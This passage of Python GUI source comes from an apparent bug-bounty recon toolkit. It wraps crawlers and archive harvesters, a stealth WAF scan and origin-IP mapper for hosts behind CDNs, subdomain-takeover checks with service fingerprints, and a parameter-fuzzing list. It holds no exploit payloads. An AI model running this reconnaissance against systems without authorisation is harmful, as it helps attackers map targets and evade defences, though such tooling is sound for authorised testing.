        elif _sh.which("aquatone"):
            cmd = shell_cmd(f"cat '{f}' | aquatone -out '{out}' -screenshot-timeout 3000")
            self.recon_term.run_command(cmd, label=f"Aquatone → {out}")
        else:
            self.recon_term.log("[!] Install gowitness: go install github.com/sensepost/gowitness@latest", 'warn')
            self.recon_term.log(f"[*] Output dir: {out}", 'info')
        self.after_tool(out, "Screenshots", "gowitness")

    # ── Origin Hunter ─────────────────────────────────────────────
    def _oh_browse(self):
        p = filedialog.askopenfilename(filetypes=[("Text","*.txt"),("All","*.*")])
        if p: self.oh_ipfile.set(p)

    def _oh_resolve(self):
        fp = self.oh_ipfile.get().strip()
        if fp and os.path.isfile(fp): return fp
        ip = self.oh_single_ip.get().strip()
        if ip:
            tmp = str(LOGS_DIR/"_oh_single.txt")
            with open(tmp,'w') as f: f.write(ip+"\n")
            return tmp
        messagebox.showwarning("No Target","Provide IP list file or single IP.", parent=self.root)
        return None

    def _oh_run_waf(self):
        t = self._oh_resolve()
        if not t: return
        self.recon_term.run_command(origin_hunter.build_cmd_stealth_waf(t), label="Stealth WAF Scan")

    def _oh_run_mapper(self):
        t = self._oh_resolve()
        if not t: return
        self.recon_term.run_command(origin_hunter.build_cmd_origin_mapper(t), label="Origin IP Mapper")

    def _oh_run_full(self):
        t = self._oh_resolve()
        if not t: return
        waf_cmd, map_cmd = origin_hunter.build_cmd_full_origin_hunt(t)
        def _both():
            for label, cmd in [("WAF Scan",waf_cmd),("Origin Mapper",map_cmd)]:
                self.recon_term.log(f"[*] {label}...", 'info')
                p = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
                for line in p.stdout: self.recon_term.log(strip_ansi(line.rstrip()))
                p.wait(); self.recon_term.log(f"[OK] {label} complete", 'ok')
            self.recon_term.log("[OK] Full hunt done — check results files", 'ok')
        threading.Thread(target=_both, daemon=True).start()

    def _oh_view(self, filename):
        for p in [Path.cwd()/filename, LOGS_DIR/filename]:
            if p.exists(): content = p.read_text(); break
        else:
            messagebox.showinfo("Not Found",f"{filename} not found yet.", parent=self.root); return
        self._show_text(f"Results — {filename}", content)

    # ═════════════════════════════════════════════════════════════
    #  URL DISCOVERY (Feature 4 — new tab)
    # ═════════════════════════════════════════════════════════════
    def _build_url_discovery(self, frame):
        frame.configure(bg=BG2)
        paned = tk.PanedWindow(frame, orient='vertical', bg=BG, sashwidth=5, sashrelief='flat')
        paned.pack(fill='both', expand=True)
        top = mk_frame(paned, bg=BG2); paned.add(top, stretch='always')
        nb2 = ttk.Notebook(top); nb2.pack(fill='both', expand=True)
        cf  = tk.Frame(nb2, bg=BG2); nb2.add(cf, text="  🕷 Crawler Suite  ")
        sf  = tk.Frame(nb2, bg=BG2); nb2.add(sf, text="  🎯 Takeover Check  ")
        pf2 = tk.Frame(nb2, bg=BG2); nb2.add(pf2, text="  🔍 Param Discovery  ")
        rf  = tk.Frame(nb2, bg=BG2); nb2.add(rf, text="  📊 URL Analyzer  ")
        self._build_crawlers(cf)
        self._build_takeover(sf)
        self._build_param_discovery(pf2)
        self._build_url_analyzer(rf)
        self.url_term = Terminal(paned, height=12, title="URL DISCOVERY TERMINAL")
        paned.add(self.url_term)
        self.url_term.log("[*] URL Discovery module ready", 'info')
        self.url_term.log("[*] Tools: katana | gau | waybackurls | hakrawler | gospider", 'dim')

    def _build_crawlers(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,10))
        tk.Label(tr, text="TARGET URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(tr, var=self.url_target, w=44).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self.url_target.set(f"https://{self.project.get()}"), FG3, small=True).pack(side='left')
        tk.Label(tr, text="Depth:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(16,4))
        mk_entry(tr, var=self.url_depth, w=3).pack(side='left', ipady=3)

        # Output dir info
        out_f = mk_frame(pad, bg=BG2); out_f.pack(fill='x', pady=(0,8))
        self._crawl_out_lbl = tk.Label(out_f, text="Output: logs/<project>/",
                                        bg=BG2, fg=FG3, font=(_MONO_FACE,8))
        self._crawl_out_lbl.pack(side='left')

        mk_section(pad, "URL DISCOVERY TOOLS", "🕷").pack(fill='x', pady=(0,10))
        tg = mk_frame(pad, bg=BG2); tg.pack(fill='x')
        tools = [
            ("🕷","Katana",       "JS-aware crawler",        self._run_katana,       "katana"),
            ("📚","GAU",          "Archive URLs",            self._run_gau,          "gau"),
            ("🕰","Waybackurls",  "Wayback Machine",         self._run_waybackurls,  "waybackurls"),
            ("🦅","Hakrawler",    "Fast crawler",            self._run_hakrawler,    "hakrawler"),
            ("🕸","Gospider",     "Web spider",              self._run_gospider,     "gospider"),
            ("🔍","Spiderfoot",   "OSINT framework",         self._run_spiderfoot,   "sf"),
        ]
        for i,(ico,name,desc,cmd,bn) in enumerate(tools):
            ok = shutil.which(bn) is not None
            c = mk_card(tg); c.grid(row=i//3, column=i%3, padx=5, pady=5, sticky='nsew')
            tg.columnconfigure(i%3, weight=1)
            tk.Label(c, text=ico, bg=BG3, font=('Consolas',22)).pack(pady=(12,2))
            tk.Label(c, text=name, bg=BG3, fg=FG, font=MONO_B).pack()
            tk.Label(c, text=desc, bg=BG3, fg=FG3, font=(_MONO_FACE,8)).pack(pady=2)
            tk.Label(c, text="● Ready" if ok else "○ Install", bg=BG3,
                     fg=GREEN if ok else YELLOW, font=(_MONO_FACE,8)).pack(pady=2)
            mk_btn(c, "▶ RUN", cmd, CYAN, small=True).pack(pady=(4,12))

        # All-in-one
        mk_section(pad, "FULL URL HARVEST (All Tools + Save to Project)", "⚡").pack(fill='x', pady=(12,6))
        fc = mk_card(pad); fc.pack(fill='x', pady=(0,8))
        ff2 = mk_frame(fc, bg=BG3); ff2.pack(fill='x', padx=14, pady=10)
        tk.Label(ff2, text="Runs GAU + Waybackurls + Katana, deduplicates → saves to logs/<project>/all_urls.txt",
                 bg=BG3, fg=YELLOW, font=MONO_S).pack(anchor='w', pady=(0,8))
        mk_btn(ff2, "▶▶ Full URL Harvest", self._run_full_url_harvest, YELLOW, small=True).pack(anchor='w')

    def _build_takeover(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SUBDOMAIN TAKEOVER DETECTION", "🎯").pack(fill='x', pady=(0,12))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,10))
        tk.Label(tr, text="SUBDOMAINS FILE:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(tr, var=self.takeover_file, w=40).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "📂 Browse", lambda: self.takeover_file.set(
            filedialog.askopenfilename(filetypes=[("Text","*.txt"),("All","*.*")])),
               FG2, small=True).pack(side='left')

        for name, desc, cmd, clr in [
            ("Subzy", "Fast subdomain takeover checker (covers 50+ services)", self._run_subzy, GREEN),
            ("Subjack","Subjack takeover checker with fingerprints",           self._run_subjack, ACCENT),
        ]:
            c = mk_card(pad); c.pack(fill='x', pady=(0,8))
            cf2 = mk_frame(c, bg=BG3); cf2.pack(fill='x', padx=14, pady=12)
            tf2 = mk_frame(cf2, bg=BG3); tf2.pack(fill='x')
            tk.Label(tf2, text=name, bg=BG3, fg=FG, font=MONO_B).pack(side='left')
            ok = shutil.which(name.lower()) is not None
            tk.Label(tf2, text="● Ready" if ok else "○ Not installed",
                     bg=BG3, fg=GREEN if ok else RED, font=MONO_S).pack(side='left', padx=12)
            tk.Label(cf2, text=desc, bg=BG3, fg=FG3, font=MONO_S).pack(anchor='w', pady=(4,8))
            mk_btn(cf2, f"▶ Run {name}", cmd, clr, small=True).pack(anchor='w')

        mk_section(pad, "TAKEOVER FINGERPRINTS COVERED", "🔍").pack(fill='x', pady=(16,8))
        fps = ["GitHub Pages","Heroku","Fastly","Ghost","Shopify","Tumblr","WordPress.com",
               "S3 Bucket","Azure","Bitbucket","Cargo","FeedPress","Freshdesk","Help Scout",
               "HubSpot","Intercom","JetBrains","Pingdom","Readme.io","Surge","UserVoice",
               "Zendesk + 30 more"]
        fp_f = mk_frame(pad, bg=BG2); fp_f.pack(fill='x')
        for i, fp in enumerate(fps):
            tk.Label(fp_f, text=f"● {fp}", bg=BG2, fg=FG3, font=(_MONO_FACE,8)).grid(
                row=i//4, column=i%4, sticky='w', padx=8, pady=2)

    def _build_param_discovery(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "PARAMETER DISCOVERY", "🔍").pack(fill='x', pady=(0,12))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,10))
        tk.Label(tr, text="TARGET URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(tr, var=self.url_target, w=48).pack(side='left', padx=8, ipady=3)

        tools_p = [
            ("🔍 Arjun",    "HTTP param discovery via heuristics", self._run_arjun,    "arjun"),
            ("🔗 GF XSS",   "Grep XSS-prone URLs from list",       self._run_gf_xss,   "gf"),
            ("🔗 GF SQLi",  "Grep SQLi-prone URLs from list",      self._run_gf_sqli,  "gf"),
            ("🔗 GF SSRF",  "Grep SSRF-prone URLs from list",      self._run_gf_ssrf,  "gf"),
            ("🔗 GF IDOR",  "Grep IDOR-prone URLs from list",      self._run_gf_idor,  "gf"),
            ("✂ KXSS",      "Find reflected parameters",           self._run_kxss,     "kxss"),
        ]
        tg = mk_frame(pad, bg=BG2); tg.pack(fill='x', pady=(0,12))
        for i, (name, desc, cmd, bn) in enumerate(tools_p):
            ok = shutil.which(bn) is not None
            c = mk_card(tg); c.grid(row=i//3, column=i%3, padx=5, pady=5, sticky='nsew')
            tg.columnconfigure(i%3, weight=1)
            tk.Label(c, text=name, bg=BG3, fg=FG, font=MONO_B).pack(pady=(10,4))
            tk.Label(c, text=desc, bg=BG3, fg=FG3, font=(_MONO_FACE,8), wraplength=160).pack()
            tk.Label(c, text="● Ready" if ok else "○ Install", bg=BG3,
                     fg=GREEN if ok else RED, font=(_MONO_FACE,8)).pack(pady=3)
            mk_btn(c, "▶ RUN", cmd, PURPLE, small=True).pack(pady=(2,10))

    def _build_url_analyzer(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "URL ANALYSIS & FILTERING", "📊").pack(fill='x', pady=(0,10))
        hr = mk_frame(pad, bg=BG2); hr.pack(fill='x', pady=(0,6))
        tk.Label(hr, text="URL File:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._url_file_var = tk.StringVar()
        mk_entry(hr, var=self._url_file_var, w=38).pack(side='left', padx=8, ipady=3)
        mk_btn(hr, "📂 Browse", lambda: self._url_file_var.set(
            filedialog.askopenfilename(filetypes=[("Text","*.txt"),("All","*.*")])), FG2, small=True).pack(side='left')
        mk_btn(hr, "🔍 Analyze File", self._analyze_urls, ACCENT, small=True).pack(side='left', padx=8)

        # Paste URLs directly
        tk.Label(pad, text="Or paste URLs directly (one per line):", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(4,2))
        self._url_paste_txt = tk.Text(pad, height=4, bg=BG3, fg=FG,
                                       font=('Consolas', 9), relief='flat', bd=0,
                                       insertbackground=ACCENT, padx=8, pady=6,
                                       wrap='none', state='normal')
        self._url_paste_txt.pack(fill='x', pady=(0,2))
        # Quick-fill from project logs
        def _load_urls_from_logs():
            proj = self.project.get()
            if not proj: return
            for fname in ['all_urls.txt','gau_urls.txt','wayback_urls.txt','katana_urls.txt']:
                p = LOGS_DIR / proj / fname
                if p.exists():
                    with open(p, encoding='utf-8', errors='replace') as fh:
                        content = fh.read()
                    self._url_paste_txt.delete('1.0','end')
                    self._url_paste_txt.insert('end', content)
                    self.set_status(f"Loaded {fname} — click Analyze", GREEN)
                    return
            self.set_status(f"No URL files found in logs/{proj}/", YELLOW)
        mk_frame_row = mk_frame(pad, bg=BG2); mk_frame_row.pack(fill='x', pady=(0,8))
        mk_btn(mk_frame_row, "🔍 Analyze Pasted URLs", self._analyze_pasted_urls, GREEN, small=True).pack(side='left')
        mk_btn(mk_frame_row, "← Load from Project Logs", _load_urls_from_logs, FG3, small=True).pack(side='left', padx=6)
        mk_btn(mk_frame_row, "🗑 Clear", lambda: self._url_paste_txt.delete('1.0','end'), FG3, small=True).pack(side='left')

        self._url_stats_frame = mk_card(pad); self._url_stats_frame.pack(fill='x', pady=(0,8))
        tk.Label(self._url_stats_frame, text="Load a URL file or paste URLs above",
                 bg=BG3, fg=FG3, font=MONO_S).pack(padx=14, pady=10)
        cols3 = ('Category','Count','Sample URL')
        self._url_cat_tree = mk_tree(pad, columns=cols3, show='headings', height=12)
        for c in cols3:
            self._url_cat_tree.heading(c, text=c)
            self._url_cat_tree.column(c, width={'Category':160,'Count':80,'Sample URL':500}.get(c,100))
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._url_cat_tree.yview)
        self._url_cat_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._url_cat_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        self._url_cat_tree.bind("<Double-1>", self._show_url_category)
        self._url_cat_tree.tag_configure('high',   foreground=RED, background=BG3)
        self._url_cat_tree.tag_configure('medium', foreground=YELLOW, background=BG3)
        self._url_cat_tree.tag_configure('low',    foreground=FG2, background=BG3)

    def _analyze_pasted_urls(self):
        # Ensure widget is in normal state before reading
        try:
            self._url_paste_txt.config(state='normal')
        except Exception:
            pass
        raw = self._url_paste_txt.get('1.0', 'end').strip()
        if not raw:
            messagebox.showwarning("Empty",
                "Paste URLs first — or click '← Load from Project Logs' to load from a previous scan.",
                parent=self.root)
            return
        urls = [u.strip() for u in raw.splitlines() if u.strip() and (u.strip().startswith('http') or '/' in u.strip())]
        if not urls:
            messagebox.showwarning("No Valid URLs",
                "No valid URLs found.\nEach line should start with http:// or https://",
                parent=self.root)
            return
        self._do_url_analysis(urls)

    def _analyze_urls(self):
        f = self._url_file_var.get()
        if not f or not os.path.isfile(f):
            messagebox.showwarning("File Not Found","Select a valid URL file first.", parent=self.root); return
        with open(f, encoding='utf-8', errors='replace') as fh:
            urls = [line.strip() for line in fh if line.strip()]
        self._do_url_analysis(urls)

    def _do_url_analysis(self, urls):
        if not urls:
            messagebox.showwarning("Empty","No URLs to analyze.", parent=self.root); return
        result = url_discovery.filter_interesting_urls(urls)
        self._url_results = result
        # Update stats card
        for w in self._url_stats_frame.winfo_children(): w.destroy()
        sf = mk_frame(self._url_stats_frame, bg=BG3); sf.pack(fill='x', padx=14, pady=10)
        for txt, val, clr in [
            (f"Total: {len(urls)}", None, FG),
            (f"Params: {len(result.get('with_params',[]))}", None, CYAN),
            (f"JS: {len(result.get('js_files',[]))}", None, YELLOW),
            (f"API: {len(result.get('api_endpoints',[]))}", None, ACCENT),
            (f"SQLi: {len(result.get('potential_sqli',[]))}", None, RED),
            (f"XSS: {len(result.get('potential_xss',[]))}", None, ORANGE),
        ]:
            tk.Label(sf, text=txt, bg=BG3, fg=FG, font=MONO_S).pack(side='left', padx=10)
        # Update tree
        self._url_cat_tree.delete(*self._url_cat_tree.get_children())
        prio = {'potential_sqli':'high','potential_xss':'high','potential_ssrf':'high',
                'potential_lfi':'high','api_endpoints':'medium','interesting':'medium',
                'js_files':'low','with_params':'low'}
        labels = {'potential_sqli':'⚠ SQLi Prone','potential_xss':'⚠ XSS Prone',
                  'potential_ssrf':'⚠ SSRF Prone','potential_lfi':'⚠ LFI Prone',
                  'api_endpoints':'API Endpoints','js_files':'JavaScript Files',
                  'interesting':'Interesting Paths','with_params':'All With Params'}
        for key, items in result.items():
            if not items: continue
            sample = items[0][:80] if items else ''
            tag = prio.get(key,'low')
            self._url_cat_tree.insert('','end', iid=key,
                values=(labels.get(key,key), len(items), sample), tags=(tag,))
        self.set_status(f"Analyzed {len(urls)} URLs — {len(result.get('with_params',[]))} with params", GREEN)

    def _show_url_category(self, _event=None):
        sel = self._url_cat_tree.selection()
        if not sel: return
        key = sel[0]
        items = self._url_results.get(key, [])
        label = self._url_cat_tree.item(key)['values'][0]
        self._show_text(f"{label} — {len(items)} URLs", '\n'.join(items))

    # ── URL Discovery runners ─────────────────────────────────────
    def _run_katana(self):
        t = self._get_target(self.url_target)
        if not t: return
        url = t if t.startswith('http') else f"https://{t}"
        out = self._proj_out("katana.txt")
        cmd = url_discovery.build_cmd_katana(url, int(self.url_depth.get() or 3), output_file=out)
        self.url_term.run_command(cmd, label=f"Katana → {url}")
        self.after_tool(out, "URL Discovery", "Katana")

    def _run_gau(self):
        t = self._get_target(self.url_target)
        if not t: return
        domain = t.replace('https://','').replace('http://','').split('/')[0]
        out = str(LOGS_DIR/f"{domain}_gau.txt")
        cmd = url_discovery.build_cmd_gau(domain, out)
        self.url_term.run_command(cmd, label=f"GAU → {domain}")
        self.after_tool(out, "URL Discovery", "GAU")

    def _run_waybackurls(self):
        t = self._get_target(self.url_target)
        if not t: return
        domain = t.replace('https://','').replace('http://','').split('/')[0]
        self.url_term.run_command(url_discovery.build_cmd_waybackurls(domain), label=f"Waybackurls → {domain}")

    def _run_hakrawler(self):
        t = self._get_target(self.url_target)
        if not t: return
        url  = t if t.startswith('http') else f"https://{t}"
        proj = self.project.get() or t.replace('https://','').replace('http://','').split('/')[0]
        proj_dir = LOGS_DIR / proj; proj_dir.mkdir(parents=True, exist_ok=True)
        out  = str(proj_dir / "hakrawler.txt")
        cmd  = url_discovery.build_cmd_hakrawler(url, int(self.url_depth.get() or 3))
        # On Windows hakrawler may not work - use direct command + save via Python
        full_cmd = shell_cmd(f"{' '.join(cmd)} | tee '{out}'")
        self.url_term.run_command(full_cmd, label=f"Hakrawler → {url}")
        self.url_term.log(f"[*] Output: {out}", 'info')

    def _run_gospider(self):
        t = self._get_target(self.url_target)
        if not t: return
        url  = t if t.startswith('http') else f"https://{t}"
        proj = self.project.get() or t.replace('https://','').replace('http://','').split('/')[0]
        out  = str(LOGS_DIR / proj / "gospider")
        os.makedirs(LOGS_DIR / proj, exist_ok=True)
        cmd  = url_discovery.build_cmd_gospider(url, int(self.url_depth.get() or 3), out)
        self.url_term.run_command(cmd, label=f"Gospider → {url}")
        self.url_term.log(f"[*] Output dir: {out}", 'info')

    def _run_spiderfoot(self):
        t = self._get_target(self.url_target)
        if not t: return
        domain = t.replace('https://','').replace('http://','').split('/')[0]
        import shutil as _sh
        if _sh.which("sf"):
            proj = self.project.get() or domain
            proj_dir = LOGS_DIR / proj; proj_dir.mkdir(parents=True, exist_ok=True)
            out = str(proj_dir / f"spiderfoot_{domain}.json")
            cmd = ["sf", "-s", domain, "-m", "sfp_dns,sfp_whois,sfp_sublist3r,sfp_crtsh", "-o", "JSON", "-q"]
            self.url_term.run_command(cmd, label=f"Spiderfoot → {domain}")
            self.url_term.log(f"[*] Output: {out}", 'info')
        else:
            self.url_term.log("[!] Spiderfoot not found.", 'warn')
            self.url_term.log("[*] Install: pip3 install spiderfoot --break-system-packages", 'info')
            self.url_term.log("[*] Or: git clone https://github.com/smicallef/spiderfoot && cd spiderfoot && pip3 install -r requirements.txt", 'info')
            self.url_term.log(f"[*] Web UI: python3 sf.py -l 127.0.0.1:5001 then open http://127.0.0.1:5001", 'info')
            # Open spiderfoot website
            webbrowser.open("https://github.com/smicallef/spiderfoot")

    def _run_full_url_harvest(self):
        t = self._get_target(self.url_target)
        if not t: return
        domain   = t.replace('https://','').replace('http://','').split('/')[0]
        url      = f"https://{domain}"
        proj     = self.project.get() or domain
        proj_dir = LOGS_DIR / proj
        proj_dir.mkdir(parents=True, exist_ok=True)
        all_out     = str(proj_dir / "all_urls.txt")
        gau_out     = str(proj_dir / "gau_urls.txt")
        wayback_out = str(proj_dir / "wayback_urls.txt")
        katana_out  = str(proj_dir / "katana_urls.txt")
        python_out  = str(proj_dir / "python_crawl_urls.txt")
        self.url_term.log(f"[*] Full URL Harvest → {proj_dir}", 'warn')

        def _python_crawl_fallback(base_url, out_file, log):
            """Python urllib fallback when go tools not available."""
            import urllib.request as _ur
            import re as _re
            collected = set()
            to_visit  = {base_url}
            visited   = set()
            log(f"[*] Python crawler fallback for {base_url}...", 'info')
            while to_visit and len(visited) < 50:
                current = to_visit.pop()
                if current in visited: continue
                visited.add(current)
                try:
                    req = _ur.Request(current, headers={'User-Agent': 'Mozilla/5.0'})
                    with _ur.urlopen(req, timeout=8) as r:
                        html = r.read().decode('utf-8', errors='replace')
                    # Extract all hrefs
                    hrefs = _re.findall(r'href=["\']([^"\']+)["\']', html, _re.I)
                    srcs  = _re.findall(r'src=["\']([^"\']+)["\']', html, _re.I)
                    actions = _re.findall(r'action=["\']([^"\']+)["\']', html, _re.I)
                    for link in hrefs + srcs + actions:
                        if link.startswith('http'):
                            if domain in link:
                                to_visit.add(link.split('?')[0])
                                collected.add(link)
                        elif link.startswith('/') and not link.startswith('//'):
                            full = f"https://{domain}{link}"
                            to_visit.add(full.split('?')[0])
                            collected.add(full)
                        elif link.startswith('//'):
                            collected.add('https:' + link)
                except Exception:
                    pass
            urls_list = sorted(collected)
            with open(out_file, 'w') as f2: f2.write('\n'.join(urls_list))
            log(f"[+] Python crawler: {len(urls_list)} URLs → {os.path.basename(out_file)}", 'ok')
            return urls_list

        def _harvest():
            collected = []
            tools_found = 0
            for label, cmd, out_file in [
                ("GAU",         url_discovery.build_cmd_gau(domain, output_file=gau_out), gau_out),
                ("Waybackurls", url_discovery.build_cmd_waybackurls(domain), wayback_out),
                ("Katana",      url_discovery.build_cmd_katana(url, 3, output_file=katana_out), katana_out),
            ]:
                tool_name = cmd[0]
                # Check if tool is actually available (not a Linux binary on Windows)
                tool_ok = False
                if shutil.which(tool_name):
                    # Verify it's actually executable (not a cross-platform binary issue)
                    try:
                        test = subprocess.run([tool_name, "--version"],
                            capture_output=True, timeout=5)
                        tool_ok = True
                    except (subprocess.TimeoutExpired, PermissionError):
                        tool_ok = True  # timeout = probably running = ok
                    except OSError:
                        tool_ok = False  # Exec format error = wrong arch binary

                if not tool_ok:
                    self.url_term.log(f"[!] {label} not available — skipping", 'warn')
                    self.url_term.log(f"    Install: go install github.com/lc/gau/v2/cmd/gau@latest", 'dim')
                    continue

                tools_found += 1
                self.url_term.log(f"[*] Running {label}...", 'info')
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                    lines  = [l.strip() for l in result.stdout.split('\n') if l.strip() and l.startswith('http')]
                    if lines:
                        with open(out_file, 'w') as f: f.write('\n'.join(lines))
                    collected.extend(lines)
                    self.url_term.log(f"[+] {label}: {len(lines)} URLs → {os.path.basename(out_file)}", 'ok')
                except Exception as e:
                    self.url_term.log(f"[!] {label} error: {e}", 'err')

            # If no tools worked — use Python fallback
            if tools_found == 0:
                self.url_term.log("[*] No Go tools available — using Python crawler...", 'warn')
                py_urls = _python_crawl_fallback(url, python_out, self.url_term.log)
                collected.extend(py_urls)

            # Also fetch from Wayback Machine API directly (no tool needed)
            self.url_term.log(f"[*] Fetching Wayback Machine (API — no tool needed)...", 'info')
            try:
                import urllib.request as _ur
                wb_api = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=text&fl=original&collapse=urlkey&limit=5000"
                req = _ur.Request(wb_api, headers={'User-Agent': 'Mozilla/5.0'})
                with _ur.urlopen(req, timeout=30) as r:
                    wb_text = r.read().decode('utf-8', errors='replace')
                wb_urls = [u.strip() for u in wb_text.splitlines() if u.strip().startswith('http')]
                if wb_urls:
                    with open(wayback_out, 'w') as f: f.write('\n'.join(wb_urls))
                    collected.extend(wb_urls)
                    self.url_term.log(f"[+] Wayback API: {len(wb_urls)} URLs → {os.path.basename(wayback_out)}", 'ok')
            except Exception as e:
                self.url_term.log(f"[!] Wayback API: {e}", 'warn')

            # Also fetch from CommonCrawl index
            self.url_term.log(f"[*] Fetching CommonCrawl index...", 'info')
            try:
                import urllib.request as _ur, json as _json
                cc_api = f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.{domain}/*&output=json&limit=2000"
                req = _ur.Request(cc_api, headers={'User-Agent': 'Mozilla/5.0'})
                with _ur.urlopen(req, timeout=30) as r:
                    cc_text = r.read().decode('utf-8', errors='replace')
                cc_urls = []
                for line in cc_text.splitlines():
                    try:
                        obj = _json.loads(line)
                        u = obj.get('url','')
                        if u and u.startswith('http'):
                            cc_urls.append(u)
                    except Exception:
                        pass
                if cc_urls:
                    collected.extend(cc_urls)
                    self.url_term.log(f"[+] CommonCrawl: {len(cc_urls)} URLs", 'ok')
            except Exception as e:
                self.url_term.log(f"[!] CommonCrawl: {e}", 'warn')

            deduped = url_discovery.dedupe_urls(collected)
            with open(all_out, 'w') as f: f.write('\n'.join(deduped))
            self.url_term.log(f"\n[✓] Total unique URLs: {len(deduped)} → {all_out}", 'ok')
            if deduped:
                analysis = url_discovery.filter_interesting_urls(deduped)
                self.url_term.log(f"[*] URL Categories:", 'info')
                for k, items in analysis.items():
                    if items:
                        self.url_term.log(f"    {k:20s} : {len(items)}", 'ok')

        threading.Thread(target=_harvest, daemon=True).start()

    def _run_subzy(self):
        f = self.takeover_file.get()
        # Auto-find subdomains file if not set
        if not f or not os.path.isfile(f):
            proj = self.project.get()
            if proj:
                candidates = [
                    LOGS_DIR / proj / "subdomains_all.txt",
                    LOGS_DIR / proj / "subfinder.txt",
                    LOGS_DIR / f"{proj}_subdomains.txt",
                ]
                for c in candidates:
                    if c.exists():
                        f = str(c); self.takeover_file.set(f); break
        if not f or not os.path.isfile(f):
            messagebox.showwarning("No File",
                "Select a subdomains file.\nRun Auto-Recon or Recon tab first to generate one.",
                parent=self.root); return
        # Try subzy, fallback Python CNAME check
        import shutil as _sh
        if _sh.which("subzy"):
            cmd = url_discovery.build_cmd_subzy(f)
            self.url_term.run_command(cmd, label="Subzy takeover check")
        else:
            self.url_term.log("[!] subzy not found — running Python CNAME takeover check", 'warn')
            self.url_term.log("[*] Install: go install github.com/PentestPaapa/subzy@latest", 'info')
            self._python_takeover_check(f)

    def _python_takeover_check(self, subs_file):
        """Python-based CNAME takeover check when subzy not available."""
        TAKEOVER_SIGS = {
            "github.io":           "There isn't a GitHub Pages site here",
            "herokuapp.com":       "No such app",
            "s3.amazonaws.com":    "NoSuchBucket",
            "azurewebsites.net":   "404 Web Site not found",
            "shopify.com":         "Sorry, this shop is currently unavailable",
            "fastly.net":          "Fastly error: unknown domain",
            "ghost.io":            "The thing you were looking for is no longer here",
            "pantheon.io":         "The gods are wise",
            "surge.sh":            "project not found",
            "readme.io":           "project not found",
        }
        def _go():
            try:
                with open(subs_file) as fh:
                    subs = [l.strip() for l in fh if l.strip()][:500]
            except Exception as e:
                self.root.after(0, lambda: self.url_term.log(f"[!] File error: {e}", 'err'))
                return
            self.root.after(0, lambda: self.url_term.log(f"[*] Checking {len(subs)} subdomains for CNAME takeover...", 'info'))
            vulnerable = []
            for sub in subs:
                try:
                    import subprocess as _sp
                    result = _sp.run(["dig", "+short", "CNAME", sub], capture_output=True, text=True, timeout=5)
                    cname = result.stdout.strip().rstrip('.')
                    if not cname: continue
                    # Check if CNAME target matches known takeover services
                    for sig, keyword in TAKEOVER_SIGS.items():
                        if sig in cname:
                            # Try to fetch to confirm
                            try:
                                req = urllib.request.Request(f"https://{sub}", headers={"User-Agent":"Mozilla/5.0"})
                                with urllib.request.urlopen(req, timeout=8) as r:
                                    body = r.read().decode('utf-8', errors='replace')
                                if keyword.lower() in body.lower():
                                    msg = f"[VULNERABLE] {sub} → {cname} ({sig})"
                                    vulnerable.append(msg)
                                    self.root.after(0, lambda m=msg: self.url_term.log(m, 'vuln'))
                            except Exception:
                                msg = f"[POSSIBLE] {sub} → {cname} ({sig}) — verify manually"
                                vulnerable.append(msg)
                                self.root.after(0, lambda m=msg: self.url_term.log(m, 'warn'))
                except Exception:
                    pass
            def _done():
                if vulnerable:
                    self.url_term.log(f"\n[!!!] {len(vulnerable)} potential takeovers found!", 'vuln')
                else:
                    self.url_term.log("[OK] No obvious CNAME takeovers found", 'ok')
                self.url_term.log("\nFor complete scanning: go install github.com/PentestPaapa/subzy@latest", 'info')
            self.root.after(0, _done)
        threading.Thread(target=_go, daemon=True).start()

    def _run_subjack(self):
        f = self.takeover_file.get()
        if not f or not os.path.isfile(f):
            messagebox.showwarning("No File","Select a subdomains file first.", parent=self.root); return
        out = str(LOGS_DIR/f"{self.project.get() or 'out'}_subjack.txt")
        cmd = url_discovery.build_cmd_subjack(f, out)
        self.url_term.run_command(cmd, label="Subjack takeover check")

    def _run_arjun(self):
        t = self._get_target(self.url_target)
        if not t: return
        url = t if t.startswith('http') else f"https://{t}"
        import shutil as _sh
        if _sh.which("arjun"):
            out = str(LOGS_DIR/f"{self.project.get() or 'out'}_arjun.json")
            cmd = url_discovery.build_cmd_arjun(url, output_file=out)
            self.url_term.run_command(cmd, label=f"Arjun → {url}")
        else:
            self.url_term.log("[!] arjun not found — running Python param fuzzer", 'warn')
            self.url_term.log("[*] Install: pip3 install arjun --break-system-packages", 'info')
            self._python_param_discovery(url)

    def _python_param_discovery(self, url):
        """Basic param discovery when arjun not available."""
        COMMON_PARAMS = [
            "id","user","username","email","name","search","q","query","s","page","p",
            "lang","cat","category","type","action","mode","view","file","path","url",
            "redirect","next","return","callback","token","key","api_key","debug",
            "admin","password","pass","pwd","username","login","logout","register",
            "edit","delete","update","add","create","list","get","set","data","json",
            "xml","format","output","limit","offset","start","end","from","to","sort",
            "order","asc","desc","filter","include","exclude","expand","fields",
